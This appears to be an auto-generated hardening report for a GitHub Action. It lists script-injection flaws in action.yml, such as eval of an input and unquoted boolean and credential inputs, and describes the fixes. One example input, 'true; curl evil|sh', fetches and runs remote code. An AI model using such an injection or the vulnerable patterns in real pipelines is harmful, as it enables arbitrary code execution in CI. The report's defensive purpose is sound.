<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.10.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.10.1** was hardened automatically. 9 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): in the 'Download Java Validator' step, the input JAVA_VALIDATOR_DOWNLOAD_LOCATION (inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION) is passed to eval: `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`. eval re-parses the value, so any $(...), backticks or ';' in the input runs as a command. The result is then used unquoted: `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`.

Locations:

- `action.yml:699`
- `action.yml:702`

### script-injection (severity: high)

Rule (b): boolean inputs are run as shell commands without quotes, e.g. `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`, `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `if $INPUT_SUSHI_ENABLED; then`, `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then`, `if $CLOSE_SLICING_FOR_VALIDATION; then`, `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`. Each value comes from an inputs.* env var and is executed as a command, so an input like `true; curl evil|sh` runs arbitrary code. This affects most steps: Check if .NET is installed, Check .NET SDK Version, Install Firely.Terminal, Check Firely Terminal Version, Simplifier login, Detect FHIR version, Validate FHIR version support, Set FHIR specification, Check if npm is installed, Check npm Version, Install fsh-sushi, Check SUSHI version, Generate conformance resources with SUSHI, Pre-processing, Configure validator engine, Run Quality Control checks, Report Success, Remove package cache, Check if Java is installed, Download Java Validator, both Java validation steps, and Re-run SUSHI.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:142`
- `action.yml:168`
- `action.yml:183`
- `action.yml:202`
- `action.yml:285`
- `action.yml:363`
- `action.yml:503`
- `action.yml:516`
- `action.yml:526`
- `action.yml:537`
- `action.yml:546`
- `action.yml:560`
- `action.yml:615`
- `action.yml:639`
- `action.yml:655`
- `action.yml:672`
- `action.yml:682`
- `action.yml:695`
- `action.yml:720`

### script-injection (severity: high)

Rule (b): in the 'Install Firely.Terminal' step, an input is expanded without quotes: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION > /dev/null` (FIRELY_TERMINAL_VERSION comes from inputs.FIRELY_TERMINAL_VERSION).

Locations:

- `action.yml:119`

### script-injection (severity: high)

Rule (b): in the 'Simplifier login' step, credential inputs are expanded without quotes: `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`.

Locations:

- `action.yml:143`

### script-injection (severity: high)

Rule (b): in the 'Install fsh-sushi' step, an input is expanded without quotes in a sudo command: `sudo npm install -g fsh-sushi@$SUSHI_VERSION` (from inputs.SUSHI_VERSION). The inherited $USER is also unquoted: `sudo chown -R $USER /usr/local/lib/node_modules`.

Locations:

- `action.yml:527`
- `action.yml:528`

### script-injection (severity: high)

Rule (b): in the 'Generate conformance resources with SUSHI' and 'Re-run SUSHI' steps, an input is expanded without quotes: `sushi $INPUT_SUSHI_OPTIONS` (from inputs.SUSHI_OPTIONS).

Locations:

- `action.yml:547`
- `action.yml:876`

### script-injection (severity: high)

Rule (b): in the 'Run Quality Control checks' step, inputs are expanded without quotes: `if echo $INPUT_EXPECTED_FAILS | grep -w -q VALIDATION_CONFORMANCE_DOTNET`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`.

Locations:

- `action.yml:641`
- `action.yml:642`
- `action.yml:644`

### script-injection (severity: high)

Rule (b): in the 'Validate all conformance resources in scope of the repository' step, workflow-controlled values are expanded without quotes: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml $GITHUB_WORKSPACE/$p*.json -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $LOCAL_IG_PARAMETERS`. FHIR_VERSION comes from env.FHIR_VERSION.

Locations:

- `action.yml:743`
- `action.yml:748`
- `action.yml:758`
- `action.yml:759`
- `action.yml:761`

### script-injection (severity: high)

Rule (b): in the 'Validate all example resources in scope of the repository' step, workflow-controlled values are expanded without quotes: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $COMBINED_IG_PARAMETERS`.

Locations:

- `action.yml:787`
- `action.yml:822`
- `action.yml:835`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

All changes are in action.yml. I did not run the action.

- **Boolean inputs:** every `if $X;` (and the `&&` / `||` forms) is now `[ "$X" = "true" ]`. For true/false values this behaves the same as before; any other value now simply counts as false and is no longer run as a command.
- **Java validator download:** I removed the `eval`. The `$JAVA_VALIDATOR_VERSION` / `${JAVA_VALIDATOR_VERSION}` placeholder in the download URL is now replaced by plain text substitution, and the URL passed to `wget` is quoted. Any other shell syntax in a custom download URL is no longer expanded.
- **Single values are now quoted:** the Firely Terminal version, the Simplifier login (`"email=..." "password=..."`), `"$USER"`, `"fsh-sushi@$SUSHI_VERSION"`, `-version "$FHIR_VERSION"`, `rm -rf "$fhirCacheLocation"`, and `echo "$FHIR_RESTORE"`.
- **Quality-control rules path:** this optional path is passed as `${VAR:+"$VAR"}`, so it drops out when empty, as before.
- **EXPECTED_FAILS checks:** these now use `printf '%s\n' "$INPUT_EXPECTED_FAILS" | grep -w -q ...`.
- **List inputs** (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES, and the IG dependency string from package.json): each becomes a bash array assigned unquoted, which splits on whitespace and expands globs exactly as the old unquoted use did, then gets passed as `"${arr[@]}"`.
- **Java `-ig` parameters:** these are now built as arrays (`-ig "$GITHUB_WORKSPACE/$p"`) instead of one long string.
- **File globs:** the `*.xml` / `*.json` patterns still expand, with the directory part quoted (`"$GITHUB_WORKSPACE/$p"*.xml`).

### Iteration 1

**Fixes applied:** github-env-injection

**Notes:**

In the step 'Detect FHIR version and determine dependency source', fhirVersion is now passed through printf '%s' | tr -d '\n\r' into a new variable, safeFhirVersion. That variable is what gets written as FHIR_VERSION to $GITHUB_ENV. Nothing else changed.

